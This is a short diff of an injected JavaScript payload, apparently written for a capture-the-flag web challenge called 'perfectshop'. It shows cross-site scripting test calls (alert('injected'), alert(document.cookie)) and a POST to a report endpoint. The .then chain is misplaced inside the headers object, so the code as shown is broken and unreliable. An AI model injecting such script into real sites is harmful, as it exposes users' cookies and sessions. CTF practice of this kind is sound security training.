@@ -1,6 +1,6 @@
 alert("injected");
 
-fetch("http://perfectshop.challs.open.ecsc2024.it/report", {
+fetch("/report", {
   method: "POST",
   body: JSON.stringify({
     id: 1
@@ -8,6 +8,8 @@ fetch("http://perfectshop.challs.open.ecsc2024.it/report", {
   headers:{
     "Content-Type": "application/x-www-form-urlencoded"
   }
+  .then(response => response.text())
+  .then(data => console.log(data))
 });
 
 alert(document.cookie);
